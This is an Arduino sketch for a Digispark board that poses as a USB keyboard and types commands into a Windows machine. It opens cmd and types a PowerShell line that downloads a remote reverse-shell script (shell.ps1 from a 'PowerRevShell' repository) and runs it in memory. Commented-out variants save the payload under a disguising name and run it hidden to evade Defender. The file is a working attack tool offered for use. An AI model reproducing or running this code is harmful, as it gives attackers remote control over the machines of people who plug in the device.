// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

void setup() 
{
  //pinMode(0, OUTPUT); //LED on Model B
	pinMode(1, OUTPUT); //LED on Model A
  //digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  delay(200);
  //digitalWrite(0, LOW);
  digitalWrite(1, LOW);
  delay(200); 
}

void loop() 
{
    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
    DigiKeyboard.sendKeyStroke(0);

    // waits half a second (500 ms) before sending any other key strokes
    //DigiKeyboard.delay(500);

    // presses <WINDOWS> + R to open run.exe and waits another half second for it to start
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_RIGHT);
    DigiKeyboard.delay(500);

    // writes "cmd" in the textbox of run.exe and presses ENTER to open it
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // expression declares a WebClient object to download our malicious script and execute it via powershell in memory
    DigiKeyboard.print("echo IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andsko92/PowerRevShell/master/shell.ps1') | powershell -noprofile");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);    

    // you can also download and save the script and save it under different name
    //DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/andsko92/PowerRevShell/master/shell.ps1" , \"NotMaliciousScript.ps1\")");
    //DigiKeyboard.delay(500);

    // opens a new run.exe instance
    //DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
    //DigiKeyboard.delay(500);

    // runs the downloaded script in hidden mode (might trigger Defender and fail to run)
    //DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\NotMaliciousScript.ps1");
    //DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // flashes LED after sucessful execution
    while (true)
    {
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
    }

}